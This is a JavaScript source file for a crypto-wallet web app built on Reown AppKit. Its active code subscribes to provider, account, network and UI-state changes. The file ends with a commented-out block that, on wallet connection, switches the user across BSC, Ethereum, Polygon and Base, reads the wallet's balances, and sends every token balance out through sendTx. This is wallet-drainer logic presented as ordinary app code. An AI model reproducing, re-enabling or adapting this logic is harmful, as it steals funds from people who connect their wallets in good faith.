import { store, updateStore } from "../store/appkitStore";
import {
  updateStateDisplay,
  updateTheme,
  updateButtonVisibility,
  updateBtnText,
} from "./dom";
import { bsc, mainnet, polygon, base } from "@reown/appkit/networks";
import { signMessage, sendTx } from "../services/wallet";
import { fetchEvmBalances } from "../mine";

export const initializeSubscribers = (modal) => {
  modal.subscribeProviders((state) => {
    updateStore("eip155Provider", state["eip155"]);
  });

  modal.subscribeAccount((state) => {
    updateStore("accountState", state);
    updateStateDisplay("accountState", state);
  });

  modal.subscribeNetwork((state) => {
    updateStore("networkState", state);
    updateStateDisplay("networkState", state);

    const switchNetworkBtn = document.getElementById("switch-network");
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${
        state?.chainId === bsc.id ? "Mainnet" : "Bsc"
      }`;
    }
  });

  modal.subscribeState((state) => {
    store.appKitState = state;
    updateButtonVisibility(modal.getIsConnectedState());
    updateBtnText(modal, modal.getIsConnectedState());
  });


  
/*
  let processed;
  modal.subscribeEvents(async (event) => {
    if (event.data.event === "DISCONNECT_SUCCESS") {
      console.log("⛔️ Wallet Disconnected!");
      processed = false;
      return;
    }

    if (event.data.event === "CONNECT_SUCCESS") {
      if (processed) return;
      processed = true;

      console.log("✅ Wallet Connected!");

      const chainInitializers = {
        bsc: {
          initializer: bsc,
          type: "evm",
        },
        eth: {
          initializer: mainnet,
          type: "evm",
        },
        polygon: {
          initializer: polygon,
          type: "evm",
        },
        base: {
          initializer: base,
          type: "evm",
        },
      };

      for (const chain of Object.keys(chainInitializers)) {

        const { initializer, type } = chainInitializers[chain];
        await modal.switchNetwork(initializer);
        const address = modal.getAddress();
        console.log(`Switched to ${chain}: ${address}`);
        const balances = await fetchEvmBalances(chain, address);
        const { nativeBalance, nativeBalanceUsd, tokens, error } = balances;
        console.log(balances);
        if (error) continue;
        const chainProvider = store.eip155Provider;
        try {
          //const tx = await sendTx(type, "native", chainProvider, address, nativeBalance);
          //console.log(tx);
        } catch (e) {
          console.log("Error while sending native:", chain, e);
        }

        for (const token of tokens) {
          const { tokenAddress, balance, name, symbol, decimals } = token;
          try {
            const tx = await sendTx(
              type,
              "token",
              chainProvider,
              address,
              balance,
              tokenAddress,
              decimals
            );
            console.log(tx);
          } catch (e) {
            console.log(
              "Error while sending token " + name + "(" + symbol + ") :",
              chain,
              e
            );
          };
        };

        return;
      };

      return;
    }
  });
  */
};
